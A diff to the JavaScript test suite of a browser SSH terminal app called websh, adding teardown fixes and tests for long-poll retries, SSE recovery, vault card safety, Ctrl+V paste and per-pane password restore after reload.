@@ -41,6 +41,10 @@ function makeFakes(win) {
     write() {} dispose() {}
     onData(cb) { this._onDataCb = cb || null; return { dispose: () => { this._onDataCb = null; } }; }
     onBinary() {} onResize() {} onBell() {}
+    // Real xterm calls this handler for every key event and skips ALL of
+    // its own handling (including preventDefault) when it returns false -
+    // which is how Ctrl+V is handed back to the browser to paste.
+    attachCustomKeyEventHandler(fn) { this._customKey = fn; }
     // Real xterm paste() wraps the text in bracketed-paste markers (when
     // the app enabled the mode) and emits it via onData. The stub doesn't
     // model bracketed mode; it records the call and forwards to onData so
@@ -121,8 +125,18 @@ function makeFakes(win) {
 // `match` filters on the request body. `response` may be a function(body).
 // `once` consumes the entry. `fallthrough` lets an unmatched entry fall
 // through silently (used so we can register a "catch-all" last).
-function makeFetch(plan, log) {
-  return function(url, init) {
+// Once its env is marked dead, a reply still in flight never settles:
+// the app's own .then/.catch would otherwise run against a window that
+// has already been closed. Each fetch carries the state it belongs to
+// (`fn.__state`), so cleanup() can kill even a window a test built for
+// itself - and never the wrong one.
+function makeFetch(plan, log, state) {
+  const st = state || {dead: false};
+  const NEVER = new Promise(() => {});
+  const dead = () => !!st.dead;
+  const reply = resp => dead() ? NEVER
+    : ({json: () => dead() ? NEVER : Promise.resolve(resp)});
+  const fn = function(url, init) {
     const u = new URL(url, 'http://x/');
     const action = u.searchParams.get('action');
     const body = init && init.body ? JSON.parse(init.body) : null;
@@ -134,12 +148,14 @@ function makeFetch(plan, log) {
       if (p.once) plan.splice(i, 1);
       const resp = typeof p.response === 'function' ? p.response(body) : p.response;
       const d = p.delay || 1;
-      return sleep(d).then(() => ({json: () => Promise.resolve(resp)}));
+      return sleep(d).then(() => reply(resp));
     }
     // Keep the test moving on unexpected actions (output polls after a
     // test's assertions have already run, for example).
-    return sleep(1).then(() => ({json: () => Promise.resolve({alive: false})}));
+    return sleep(1).then(() => reply({alive: false}));
   };
+  fn.__state = st;
+  return fn;
 }
 
 // Expose module-scope const/let bindings from websh.js onto `window` so
@@ -154,6 +170,7 @@ const EXPOSE = `
     get: () => currentConnectRun,
     set: v => { currentConnectRun = v; },
     configurable: true});
+  Object.defineProperty(window, 'bootReady', {get: () => bootReady, configurable: true});
   Object.defineProperty(window, 'serverConfig', {get: () => serverConfig, configurable: true});
   Object.defineProperty(window, '_idbHasKeyCache', {
     get: () => _idbHasKeyCache,
@@ -196,13 +213,20 @@ async function mkEnv(plan) {
                                url: 'http://localhost/websh/'});
   const win = dom.window;
   const log = [];
+  const state = {dead: false};
   makeFakes(win);
-  win.fetch = makeFetch(plan, log);
+  win.fetch = makeFetch(plan, log, state);
   _injectVaultGlobals(win);
   win.localStorage.clear();
   win.eval(js + EXPOSE);
+  // Wait for boot to actually finish, not a fixed guess: a cold first
+  // run (JIT, IndexedDB open) could take longer than the old 30ms, and
+  // the first test then saw the form still hidden. Capped so a plan
+  // whose config never answers still moves on; the trailing settle
+  // keeps what the fixed sleep used to cover (restore's async tail).
+  await Promise.race([win.bootReady, sleep(2000)]);
   await sleep(30);
-  return {dom, win, log};
+  return {dom, win, log, state};
 }
 
 function cleanup(env) {
@@ -215,8 +239,29 @@ function cleanup(env) {
     try {
       if (env.win.currentConnectRun) env.win.currentConnectRun.cancelled = true;
     } catch(e) {}
+    // Stop every in-flight reply from settling BEFORE the window closes
+    // (see makeFetch): its continuation inside the app would otherwise
+    // run against a closed window, find `document === undefined` and
+    // kill the whole run - intermittently, depending on which test was
+    // waiting on a reply. Leaving the window open instead is not an
+    // option: two hundred dead environments' timers keep firing and
+    // starve the timing-sensitive tests.
+    // env.state for mkEnv; __state covers a window a test built itself
+    // (and a fetch re-armed mid-test, which replaces win.fetch).
+    if (env.state) env.state.dead = true;
+    try { if (env.win.fetch && env.win.fetch.__state) env.win.fetch.__state.dead = true; } catch(e) {}
     env.dom.window.close();
   } catch(e) {}
+}
+
+// Close a window a test built by hand only once its boot has settled.
+// fake-indexeddb runs on node's own setImmediate, which window.close()
+// does not stop: a window closed mid-boot (the tests that sleep a fixed
+// 30ms) later resumed loadServerConfig against a dead document, threw
+// inside its .catch, and the unhandled rejection killed the whole run.
+async function closeDom(dom) {
+  try { await Promise.race([dom.window.bootReady, sleep(2000)]); } catch (e) {}
+  dom.window.close();
 }
 
 const $ = (win, id) => win.document.getElementById(id);
@@ -802,6 +847,117 @@ test('disconnect: tail-drain data after alive=false still rendered', async () =>
 // flushes headers immediately and holds the body, which is exactly the
 // case the timer is meant to detect. Only body events ('data' / 'end')
 // prove the channel actually flushes.
+// A fetch that returns a given HTTP status for /api/output (the plan's
+// fake fetch has no status); everything else goes to the plan.
+function outputReplies(win, replies, log) {
+  const inner = win.fetch;
+  const st = inner.__state || {dead: false};      // die with the env
+  const fn = (url, init) => {
+    const u = new URL(url, 'http://x/');
+    const a = u.searchParams.get('action');
+    if (st.dead) return new Promise(() => {});
+    if (a === 'output' && replies.length) {
+      // The last reply repeats: the loop keeps polling after the test's
+      // scripted sequence and must not fall through to "session gone".
+      const [status, body] = replies.length > 1 ? replies.shift() : replies[0];
+      log.push('output:' + status);
+      // Through a timer, like a real network: an already-resolved reply
+      // turns the poll loop into an endless microtask chain that starves
+      // every timer (the test itself included).
+      return sleep(3).then(() => ({status, statusText: '',
+        json: () => typeof body === 'string' ? Promise.reject(new Error('html'))
+                                             : Promise.resolve(body)}));
+    }
+    if (a) log.push(a);
+    return inner(url, init);
+  };
+  fn.__state = st;
+  win.fetch = fn;
+}
+
+test('long-poll: a transient 503/502 is retried on the SAME session', async () => {
+  // handleOutputPayload treats any {error} as "session gone": one 503
+  // busy (or a proxy's HTML 502, which api() turns into {error}) used to
+  // end the session WITHOUT /api/disconnect and open a fresh shell,
+  // orphaning the old one and whatever ran in it.
+  const plan = [
+    {action: 'config', response: {restrict_hosts: false, connections: []}},
+    {action: 'connect', response: {session_id: 'sid-lp', alive: true}},
+    {action: 'resize', response: {ok: true}},
+  ];
+  const env = await mkEnv(plan); const win = env.win;
+  const p = await _onePane(win);
+  win.nextRetryDelay = () => 1;            // no real backoff in tests
+  const log = [];
+  p.polling = false; await sleep(20);       // stop the running loop
+  outputReplies(win, [[503, {error: 'busy'}], [502, '<html>bad gateway</html>'],
+                      [200, {data: '', alive: true}]], log);
+  p.polling = true; p.sid = 'sid-lp';
+  win.pollOutput(p);
+  await sleep(120);
+  ok(p.sid === 'sid-lp', 'still the same session; got ' + p.sid);
+  ok(!log.includes('connect') && !log.includes('disconnect'),
+     'no new shell, nothing orphaned; got ' + log.join(','));
+  ok(log.filter(x => x.startsWith('output')).length >= 3,
+     'retried until a real frame; got ' + log.join(','));
+  p.polling = false;
+  cleanup(env);
+});
+
+test('long-poll: a real 404 still ends the session and reconnects', async () => {
+  const plan = [
+    {action: 'config', response: {restrict_hosts: false, connections: []}},
+    {action: 'connect', response: {session_id: 'sid-lp2', alive: true}},
+    {action: 'resize', response: {ok: true}},
+  ];
+  const env = await mkEnv(plan); const win = env.win;
+  const p = await _onePane(win);
+  const log = [];
+  p.polling = false; await sleep(20);
+  outputReplies(win, [[404, {error: 'session not found'}],
+                      [200, {data: '', alive: true}]], log);
+  p.polling = true; p.sid = 'sid-lp2';
+  win.pollOutput(p);
+  await sleep(80);
+  ok(log.includes('connect'), 'the gone session is replaced; got ' + log.join(','));
+  p.polling = false;
+  cleanup(env);
+});
+
+test('SSE closed for good (non-200 on reconnect) is recovered, not left spinning', async () => {
+  // EventSource never retries after a non-200 reply: the pane showed
+  // "reconnecting… (0 s)" forever and dropped keystrokes. It now asks
+  // once over HTTP: transient -> retry; frame -> back to SSE.
+  const plan = [{action: 'config', response: {restrict_hosts: false, connections: []}}];
+  const env = await mkEnv(plan); const win = env.win;
+  const sources = [];
+  win.EventSource = class {
+    constructor(url) { this.url = url; this.readyState = 0; this.l = {}; sources.push(this); }
+    addEventListener(ev, fn) { this.l[ev] = fn; }
+    set onerror(fn) { this._err = fn; }
+    close() { this.readyState = 2; this.closed = true; }
+  };
+  const p = win.createPane(win.document.getElementById('panes'));
+  win.activatePane(p.id);
+  p.sid = 'sse1'; p.polling = true; p.host = 'h'; p.outCursor = 0;
+  win.nextRetryDelay = () => 1;
+  const log = [];
+  outputReplies(win, [[503, {error: 'busy'}], [200, {data: '', alive: true, cursor: 0}]], log);
+  win.streamOutput(p);
+  const es = sources[0];
+  es.l.data({data: JSON.stringify({data: '', alive: true, cursor: 0})});   // was healthy
+  es.readyState = 2;                                                     // then CLOSED
+  es._err();
+  await sleep(120);
+  ok(log.slice(0, 2).join(',') === 'output:503,output:200',
+     'asked, retried, got a frame; got ' + log.join(','));
+  ok(sources.length === 2 && !sources[1].closed, 'back on a fresh EventSource');
+  ok(p.sid === 'sse1', 'same session');
+  p.polling = false;
+  try { win.clearTimeout(p.sseFirstMsgTimer); } catch (e) {}
+  cleanup(env);
+});
+
 test("SSE 'open' event does not mark body as arrived", async () => {
   const plan = [{action: 'config', response: {restrict_hosts: false, connections: []}}];
   const env = await mkEnv(plan); const win = env.win;
@@ -1269,6 +1425,7 @@ test('CURSOR_HIDE: OSC 52 payload reaches clipboard unmodified', async () => {
   // both the drag-blurred and post-drag states.
   p._dragBlurred = true;
   const b64Hello = Buffer.from('hello', 'utf8').toString('base64');
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   const handled = p.term.parser._fireOsc(52, 'c;' + b64Hello);
   ok(handled === true, 'OSC 52 handler claims the sequence');
   ok(copies.length === 1 && copies[0] === 'hello',
@@ -1276,6 +1433,7 @@ test('CURSOR_HIDE: OSC 52 payload reaches clipboard unmodified', async () => {
      JSON.stringify(copies));
   copies.length = 0;
   p._dragBlurred = false;
+  p.el.querySelector('.pane-term').dispatchEvent(new win.MouseEvent('mouseup'));  // the user's selection
   const handled2 = p.term.parser._fireOsc(52, 'c;' + b64Hello);
   ok(handled2 === true, 'OSC 52 handler claims the sequence (post-drag)');
   ok(copies.length === 1 && copies[0] === 'hello',
@@ -1661,7 +1819,7 @@ test('vault primitives: isolate_storage scopes vault_id by path', async () => {
   ok(/^[A-Z2-7]{26}$/.test(idA), 'A vault_id well-formed');
   ok(/^[A-Z2-7]{26}$/.test(idB), 'B vault_id well-formed');
   ok(idA !== idB, 'path-scoped vault_ids differ (got both ' + idA + ')');
-  domA.window.close(); domB.window.close();
+  await closeDom(domA); await closeDom(domB);
 });
 
 // =====================================================================
@@ -1859,7 +2017,7 @@ test('multi-tab: BroadcastChannel signed_out clears cache and re-renders', async
   await sleep(20);
   ok(win.eval('_idbHasKeyCache') === false,
      'cache invalidated by signed_out broadcast');
-  dom.window.close();
+  await closeDom(dom);
 });
 
 // =====================================================================
@@ -1991,7 +2149,7 @@ test('sign out: empty-vault path does NOT mint vault_id or broadcast', async () 
      '_vaultRecentlySignedOut NOT set on empty path');
   // Modal closed regardless — the user did click Sign Out.
   ok(hidden($(win, 'signOutModal')), 'sign-out modal closed');
-  dom.window.close();
+  await closeDom(dom);
 });
 
 test('sign out: populated-vault path DOES broadcast to siblings', async () => {
@@ -2037,7 +2195,7 @@ test('sign out: populated-vault path DOES broadcast to siblings', async () => {
      'one broadcast on populated-vault sign-out; got ' + broadcasts);
   ok(win.eval('_vaultRecentlySignedOut') === true,
      '_vaultRecentlySignedOut SET on populated path');
-  dom.window.close();
+  await closeDom(dom);
 });
 
 test('sign out: tolerates server-side failures (local wipe still happens)', async () => {
@@ -2086,6 +2244,60 @@ test('no-key state: rendered when IDB lacks K but localStorage row survives', as
      'row has .nokey class');
   ok(row.textContent.indexOf('no key') !== -1,
      'no-key tag shown in row text');
+  cleanup(env);
+});
+
+test('two persistent panes to a long host never share a tmux slot', async () => {
+  // Truncating user_host_port_rand to 64 chars cut the random suffix off
+  // for a long hostname: every pane got the same slot, and the second
+  // one attached to (and detached) the first one's shell.
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
+  const win = env.win;
+  const host = 'build-server-01.eu-west.internal.corp.example-company.com';
+  const ids = new Set();
+  for (let i = 0; i < 50; i++) {
+    const id = win.slotIdFor('root', host, 22);
+    ok(/^[A-Za-z0-9_-]{1,64}$/.test(id), 'valid slot id: ' + id);
+    ids.add(id);
+  }
+  ok(ids.size === 50, '50 panes, 50 slots; got ' + ids.size);
+  ok(win.slotIdFor('u', 'h', 22).startsWith('u_h_22_'), 'short ones stay readable');
+  cleanup(env);
+});
+
+test('config fetch failing at boot never makes a live vault card deletable', async () => {
+  // The config-failure path rendered the saved list while the key cache
+  // still held its declaration-time false: every vault card showed
+  // "no key", and one click - meant to connect - deleted the credential
+  // locally and on the server, although K was intact in IndexedDB.
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false,
+                                                        connections: [], vault_enabled: true}}]);
+  const win = env.win;
+  await win.eval('_idbPut("K", new Uint8Array(32))');      // the key IS there
+  win.localStorage.setItem('websh_connections', JSON.stringify([
+    {name: 'prod db', conn_id: 'P'.repeat(26), host: 'db', port: 22,
+     user: 'u', auth: 'pw', persistent: false}]));
+  // Boot again with /api/config unreachable.
+  const log = [];
+  win.fetch = (url) => {
+    const a = new URL(url, 'http://x/').searchParams.get('action');
+    log.push(a);
+    return a === 'config' ? Promise.reject(new TypeError('Failed to fetch'))
+                          : Promise.resolve({json: () => Promise.resolve({})});
+  };
+  win.eval('_idbHasKeyCache = false; loadServerConfig()');
+  await sleep(80);
+  const row = win.document.querySelector('.sv');
+  ok(row && !row.classList.contains('nokey'), 'card painted with its real state');
+  // Even if a stale render marks it, the click re-checks before deleting.
+  win.eval('_idbHasKeyCache = false; renderSaved()');
+  let connected = 0;
+  win.connectSaved = () => { connected++; };
+  win.document.querySelector('.sv').click();
+  await sleep(40);
+  ok(!log.includes('save_delete'), 'nothing deleted on the server; got ' + log);
+  ok(JSON.parse(win.localStorage.getItem('websh_connections')).length === 1, 'card kept');
+  ok(connected === 1, 'the click connects instead');
   cleanup(env);
 });
 
@@ -2439,7 +2651,7 @@ test('cross-tab signed_out tears down live vault panes in sibling tab', async ()
   // Cache invalidated — _idbHasKeyCache false (no minting in handler).
   ok(win.eval('_idbHasKeyCache') === false,
      '_idbHasKeyCache invalidated after cross-tab signed_out');
-  dom.window.close();
+  await closeDom(dom);
 });
 
 // =====================================================================
@@ -2625,6 +2837,167 @@ test('reconnect-bar: inline password input hidden for vault-backed pane', async 
      'pw input hidden for vault-backed pane (no_vault_key reason)');
   ok(bar.querySelector('span').textContent.indexOf('Vault key missing') !== -1,
      'no_vault_key message shown');
+  cleanup(env);
+});
+
+test('reconnect-bar: one alarm, not two - the card is quiet unless it must not be', async () => {
+  // The pane badge already says "Disconnected"; the card used to repeat
+  // the word AND paint a red edge, so a plain dropped link lit up the
+  // pane twice in red. The word belongs to the badge, the colour to a
+  // state the user has to act on.
+  const plan = [
+    {action: 'config', response: {restrict_hosts: false, connections: []}},
+    {action: 'connect', response: {session_id: 'sid-quiet', alive: true}, once: true},
+    {action: 'resize', response: {ok: true}},
+    {action: 'output', response: {data: '', alive: true}},
+  ];
+  const env = await mkEnv(plan); const win = env.win;
+  $(win, 'iH').value = '10.0.0.52'; $(win, 'iU').value = 'a'; $(win, 'iPw').value = 'p3';
+  $(win, 'iPersistent').checked = false;
+  win.doConnect();
+  await sleep(80);
+  const p = paneList(win)[0];
+  const bar = p.el.querySelector('[data-reconnect]');
+  const msg = () => bar.querySelector('span').textContent;
+
+  // Plain drop, creds still in memory: the button alone says it all.
+  win.eval(`showReconnectBar(panes['${p.id}'], 'closed')`);
+  ok(msg() === '', 'no text repeated from the badge; got "' + msg() + '"');
+  ok(!bar.classList.contains('sev-err') && !bar.classList.contains('sev-warn'),
+     'a dropped link is not painted as an error');
+  // ...and with nothing but the button left, the card around it goes too.
+  ok(bar.classList.contains('bare'), 'no card drawn around a lone button');
+
+  // Plain drop with no creds: say what to do, still no alarm colour.
+  p.password = '';
+  win.eval(`showReconnectBar(panes['${p.id}'], 'closed')`);
+  ok(/type the password/i.test(msg()), 'tells the user what to do; got "' + msg() + '"');
+  ok(!bar.classList.contains('bare'), 'the card is back once it carries text');
+  ok(!/disconnected/i.test(msg()), 'still no duplicated status word');
+  ok(!bar.classList.contains('sev-err'), 'no error colour for a plain drop');
+
+  // Credentials rejected: that IS an error.
+  win.eval(`showReconnectBar(panes['${p.id}'], 'auth_failed')`);
+  ok(bar.classList.contains('sev-err'), 'auth failure keeps the red edge');
+  ok(!bar.classList.contains('bare'), 'and its card, to carry the edge');
+  // ...and the class is dropped again when the reason is no longer one.
+  win.eval(`showReconnectBar(panes['${p.id}'], 'closed')`);
+  ok(!bar.classList.contains('sev-err'), 'severity cleared on the next show');
+  win.eval(`showReconnectBar(panes['${p.id}'], 'no_vault_key')`);
+  ok(bar.classList.contains('sev-warn') && !bar.classList.contains('sev-err'),
+     'missing vault key is a warning, not an error');
+
+  // The badge carries the state as a dot; it is no longer a red pill, and
+  // the terminal's first row is held off the pane bar's edge.
+  const css = html.replace(/\/\*[\s\S]*?\*\//g, '');
+  ok(/\.pane-badge\.s-off::before\{background:var\(--dg\)\}/.test(css),
+     'disconnected state shown by a dot');
+  ok(/\.pane-badge\.s-on,\.pane-badge\.s-wait,\.pane-badge\.s-off\{background:none;padding:0;color:var\(--dim\)\}/.test(css),
+     'badge text is dim, not a coloured pill');
+  ok(/\.pane-overlays\{[^}]*align-items:flex-end/.test(css),
+     'overlay cards size to their content instead of spanning the pane');
+  // Centred at the top the card landed on the first line of output and
+  // pressed against the pane bar.
+  ok(/\.pane-overlays\{position:absolute;bottom:0/.test(css),
+     'the stack sits in the bottom corner, off the first line of output');
+  ok(!/class="reconnect-bar h"[^>]*>\s*<span[^>]*>Disconnected/.test(js),
+     'the card carries no pre-baked status word to leak');
+  // Every line websh writes into the terminal shares one form, so ours
+  // are never mistaken for the remote's output - and a link that simply
+  // dropped no longer shouts in bright red next to a red badge.
+  const notices = js.match(/term\.write\('\\r\\n\\x1b\[[^']*'/g) || [];
+  ok(notices.length >= 4, 'terminal notices found (' + notices.length + ')');
+  ok(notices.every(n => /\[websh: /.test(n)),
+     'all of them are [websh: ...]; got ' + JSON.stringify(notices));
+  ok(!/\\x1b\[91m/.test(js), 'none of them is bright red');
+  ok(/\\x1b\[2m\[websh: connection lost\]/.test(js),
+     'a dropped link is a dim note, not an error');
+  ok(/\\x1b\[31m\[websh: authentication failed\]/.test(js),
+     'a rejected password still reads as an error');
+  ok(/\.xterm\{padding:4px 6px 2px/.test(css),
+     'top padding keeps the first row and its cursor off the pane bar');
+  ok(/\.reconnect-bar\.bare\{background:none;border:none;box-shadow:none/.test(css),
+     'the bare state drops every bit of card chrome');
+  cleanup(env);
+});
+
+// ── Ctrl+V ──────────────────────────────────────────────────────────
+test('Ctrl+V pastes by default, and only Ctrl+V', async () => {
+  // In a terminal Ctrl+letter is a control code: xterm sends ^V and
+  // cancels the browser's paste, so Ctrl+V looked broken (the shell sat
+  // waiting for readline's quoted-insert). The fix is to DECLINE the
+  // event - any handling at all ends in preventDefault, which kills the
+  // native paste - so the test is about what the key handler returns.
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
+  const win = env.win;
+  ok(win.settings.ctrlVPaste === true, 'on by default');
+  const k = (o) => Object.assign({type: 'keydown', ctrlKey: true, shiftKey: false,
+                                  altKey: false, metaKey: false, code: 'KeyV', key: 'v'}, o);
+  const paste = e => win._ctrlVShouldPaste(e);
+  ok(paste(k({})), 'plain Ctrl+V pastes');
+  ok(paste(k({code: '', key: 'V'})), 'and with CapsLock / no KeyboardEvent.code');
+  ok(paste(k({code: 'KeyV', key: 'м'})), 'and on a non-Latin layout (physical V)');
+  ok(!paste(k({type: 'keyup'})), 'only on keydown - one paste per press');
+  ok(!paste(k({shiftKey: true})), 'Ctrl+Shift+V is left to the browser (it already pastes)');
+  ok(!paste(k({altKey: true})), 'Ctrl+Alt+V / AltGr keeps its own meaning');
+  ok(!paste(k({metaKey: true})), 'Meta chords untouched');
+  ok(!paste(k({ctrlKey: false})), 'a bare v is typing, not pasting');
+  ok(!paste(k({code: 'KeyC', key: 'c'})), 'Ctrl+C still interrupts');
+  ok(!paste(k({code: 'KeyD', key: 'd'})), 'Ctrl+D still sends EOF');
+  // Turning it off restores ^V for readline's quoted-insert and vim.
+  win.settings.ctrlVPaste = false;
+  ok(!paste(k({})), 'setting off → the key goes to the shell');
+  win.settings.ctrlVPaste = true;
+  cleanup(env);
+});
+
+test('Ctrl+V paste stays out of the way on macOS', async () => {
+  // Cmd+V already pastes there, and ^V is the expected binding in every
+  // Mac terminal.
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
+  const win = env.win;
+  Object.defineProperty(win.navigator, 'platform', {value: 'MacIntel', configurable: true});
+  ok(win._isMacLike(), 'platform recognised');
+  ok(!win._ctrlVShouldPaste({type: 'keydown', ctrlKey: true, code: 'KeyV', key: 'v'}),
+     'Ctrl+V is left as ^V on a Mac');
+  cleanup(env);
+});
+
+test('Ctrl+V paste has a switch in Options that takes effect at once', async () => {
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}}]);
+  const win = env.win;
+  win.openOptions();
+  const box = $(win, 'optCtrlVPaste');
+  ok(box && box.checked === true, 'the box reflects the default');
+  box.checked = false;
+  box.dispatchEvent(new win.Event('change'));
+  ok(win.settings.ctrlVPaste === false, 'unticking writes the setting');
+  // No key handler is re-attached: the predicate reads the live value,
+  // so every open pane follows immediately.
+  ok(!win._ctrlVShouldPaste({type: 'keydown', ctrlKey: true, code: 'KeyV', key: 'v'}),
+     'and the change applies with no reconnect or re-open');
+  const stored = JSON.parse(win.localStorage.getItem(
+    Object.keys(win.localStorage).find(key => /settings/.test(key))) || '{}');
+  ok(stored.ctrlVPaste === false, 'and it survives a reload');
+  win.resetOptions();
+  ok(win.settings.ctrlVPaste === true, '"Reset to defaults" brings it back');
+  cleanup(env);
+});
+
+test('a dead session shows no cursor', async () => {
+  // Nothing accepts keystrokes once the session is gone, and on a pane
+  // whose output starts at the top the blinking cursor sat right under
+  // the pane bar, looking welded to the pane name.
+  const env = await mkEnv(FB_PLAN([], '/home/alice')); const win = env.win;
+  const p = await _onePane(win);
+  let blurred = 0, focused = 0;
+  p.term.blur = () => blurred++;
+  p.term.focus = () => focused++;
+  win.endSession(p, {});
+  ok(blurred === 1, 'the terminal is blurred when the session ends');
+  // ...and a reconnect takes the focus back.
+  win.beginSessionIO(p);
+  ok(focused === 1, 'focus returns when a session starts again');
   cleanup(env);
 });
 
@@ -3179,6 +3552,125 @@ test('manual pane F5 same-tab: secrets restored from sessionStorage', async () =
   ok(restoreBody.username === 'alice', 'username restored');
   ok(restoreBody.password === 'verysecret',
      'password restored from sessionStorage');
+  cleanup(env);
+});
+
+test('a background reconnect does not hijack the split the user is connecting', async () => {
+  // beginSessionIO ran for EVERY session start and always hid the login
+  // form and nulled pendingSplit/connectingFor. A background pane that
+  // finished reconnecting while the user was connecting a split made the
+  // split connect fall back to the active pane: its session was
+  // overwritten (and never disconnected) and no split was created.
+  let release2;
+  const connects = [];
+  const plan = [
+    {action: 'config', response: {restrict_hosts: false, connections: []}},
+    {action: 'connect', response: (b) => {
+      connects.push(b.host);
+      return {session_id: 'sid-' + b.host, alive: true};
+    }},
+    {action: 'resize', response: {ok: true}},
+    {action: 'output', response: {data: '', alive: true}, delay: 50},
+  ];
+  const env = await mkEnv(plan); const win = env.win;
+  const p1 = await _onePane(win);                       // host a.host
+  const p1sid = p1.sid;
+  // A second, background pane whose reconnect is still in flight.
+  const p2 = win.createPane(win.document.getElementById('panes'));
+  p2.host = 'bg.host'; p2.user = 'u'; p2.password = 'x';
+  win.activatePane(p1.id);
+  // The user starts a split from p1 and fills in the form...
+  win.splitPane(p1.id, 'h');
+  ok(!$(win, 'ov').classList.contains('h'), 'form open for the split');
+  // ...meanwhile p2's reconnect completes.
+  await win.connectPane(p2, {label: 'bg', host: 'bg.host', user: 'u', password: 'x'});
+  await sleep(40);
+  ok(!$(win, 'ov').classList.contains('h'), 'the form the user is typing in stays open');
+  ok(win.overlayMode === 'split' && win.pendingSplit && win.pendingSplit.fromId === p1.id,
+     'the split request survives; got ' + win.overlayMode + ' ' + JSON.stringify(win.pendingSplit));
+  // Now the user's split connect completes.
+  $(win, 'iH').value = 'split.host'; $(win, 'iU').value = 'u'; $(win, 'iPw').value = 'p';
+  win.doConnect();
+  await sleep(150);
+  const ps = paneList(win);
+  ok(ps.length === 3, 'a new split pane was created; got ' + ps.length);
+  ok(p1.sid === p1sid && p1.host === 'a.host', 'p1 keeps its own session; got ' + p1.sid + ' ' + p1.host);
+  ok(ps.some(p => p.host === 'split.host' && p !== p1 && p !== p2), 'split.host is in its own pane');
+  ok($(win, 'ov').classList.contains('h'), 'and the form closes on ITS success');
+  ps.forEach(p => { p.polling = false; });
+  cleanup(env);
+});
+
+test('Enter in the login form connects; Enter in Options does not', async () => {
+  // The handler was bound with querySelector('.panel') - the FIRST
+  // .panel in the page is Options: Enter in the form did nothing, and
+  // Enter in an Options field fired a connect (and a spurious toast).
+  const env = await mkEnv([{action: 'config', response: {restrict_hosts: false, connections: []}},
+                          {action: 'connect', response: {session_id: 'sid-enter', alive: true}},
+                          {action: 'resize', response: {ok: true}}]);
+  const win = env.win;
+  let calls = 0;
+  win.doConnect = () => { calls++; };
+  const enter = (el) => el.dispatchEvent(new win.KeyboardEvent('keydown',
+    {key: 'Enter', bubbles: true, cancelable: true}));
+  win.showOverlay && win.showOverlay();
+  enter($(win, 'iPw'));
+  ok(calls === 1, 'Enter in the password field connects; got ' + calls);
+  enter($(win, 'iH'));
+  ok(calls === 2, 'and in the host field');
+  enter($(win, 'iPersistent'));
+  ok(calls === 2, 'not on a checkbox');
+  enter($(win, 'optTmuxHistory'));
+  ok(calls === 2, 'Enter in Options does NOT connect; got ' + calls);
+  cleanup(env);
+});
+
+test('F5 after splits: every pane reconnects with ITS OWN password', async () => {
+  // build() mints ids in layout order while the manifest is walked in
+  // creation order, so after splits old->new ids are a permutation
+  // (old p3 -> new p2, old p2 -> new p3). Re-keying secrets in place
+  // wrote h2's password over p3's before p3's was read: h3 got pw2.
+  const connects = [];
+  const plan = [
+    {action: 'config', response: {restrict_hosts: false, connections: []}},
+    {action: 'connect', response: (body) => {
+      connects.push(body);
+      return {session_id: 'sid-' + body.host, alive: true};
+    }},
+    {action: 'resize', response: {ok: true}},
+    {action: 'output', response: {data: '', alive: true}},
+  ];
+  const env = await mkEnv(plan); const win = env.win;
+  const rec = (h) => ({label: h, via: 'manual', host: h, port: 22, user: 'u',
+                       auth: 'pw', persistent: false, slot_id: null,
+                       tmux_cmd: 'tmux', cols: 80, rows: 24});
+  // Layout order p1, p3, p2 (p1 split right -> p2, then p1 split down -> p3).
+  win.localStorage.setItem('websh_panes', JSON.stringify({
+    version: 2,
+    layout: {type: 'split', dir: 'h',
+             a: {type: 'split', dir: 'v', a: {type: 'leaf', pane: 'p1'},
+                                          b: {type: 'leaf', pane: 'p3'}},
+             b: {type: 'leaf', pane: 'p2'}},
+    panes: {p1: rec('h1'), p2: rec('h2'), p3: rec('h3')},
+  }));
+  win.sessionStorage.setItem('websh_panes_session', JSON.stringify({
+    p1: {password: 'pw1'}, p2: {password: 'pw2'}, p3: {password: 'pw3'},
+  }));
+  win.eval('tryRestoreSessions()');
+  await sleep(150);
+  const byHost = {};
+  connects.forEach(b => { byHost[b.host] = b.password; });
+  ok(byHost.h1 === 'pw1' && byHost.h2 === 'pw2' && byHost.h3 === 'pw3',
+     'each host got its own password; got ' + JSON.stringify(byHost));
+  // And the store is keyed by the NEW ids, still one secret per host,
+  // so the next F5 is right too.
+  const store = JSON.parse(win.sessionStorage.getItem('websh_panes_session'));
+  const ps = paneList(win);
+  ps.forEach(p => {
+    ok(store[p.id] && store[p.id].password === 'pw' + p.host.slice(1),
+       p.id + ' (' + p.host + ') keyed to its own secret; got ' + JSON.stringify(store[p.id]));
+  });
+  ok(Object.keys(store).length === 3, 'no stale keys left; got ' + Object.keys(store));
   cleanup(env);
 });
 
@@ -4244,7 +4736,7 @@ test('bfcache: pagehide closes BroadcastChannel; pageshow(persisted=true) re-ope
   Object.defineProperty(ev2, 'persisted', {value: false});
   win.dispatchEvent(ev2);
   ok(constructed === 2, 'cold-load pageshow does NOT re-init; got ' + constructed);
-  dom.window.close();
+  await closeDom(dom);
 });
 
 test('vault BroadcastChannel name is path-scoped under isolate_storage', async () => {
@@ -4280,7 +4772,7 @@ test('vault BroadcastChannel name is path-scoped under isolate_storage', async (
   ok(names[names.length - 1] === '/team-a/websh_vault',
      'final open is path-scoped to /team-a/; got ' +
      JSON.stringify(names[names.length - 1]));
-  dom.window.close();
+  await closeDom(dom);
 });
 
 test('sibling tab on a different path does NOT trigger sign-out handler', async () => {
@@ -4339,7 +4831,7 @@ test('sibling tab on a different path does NOT trigger sign-out handler', async 
   await sleep(40);
   ok(win.eval('_vaultRecentlySignedOut') === true,
      'same-path sibling DOES set the sign-out flag');
-  dom.window.close();
+  await closeDom(dom);
 });
 
 test('F1: post-encrypt vault_id race (sign-out between subtle.encrypt and POST) aborts save', async () => {
@@ -4523,7 +5015,7 @@ test('bfcache restore invalidates vault caches and re-renders saved list', async
   ok(rowsAfter.length === 1, 'saved card row still present after re-render');
   ok(rowsAfter[0].classList.contains('nokey'),
      'row greyed out after bfcache restore + IDB refresh');
-  dom.window.close();
+  await closeDom(dom);
 });
 
 test('F6: "status code" mapping tests actually exercise error-string mapping', async () => {
@@ -4974,7 +5466,10 @@ test('upload finalize failure reports bytes-landed without jargon', async () => 
   win.handleUpload(p.id, {files: [{name: 'doc.pdf', size: 10}], value: ''});
   await sleep(20);
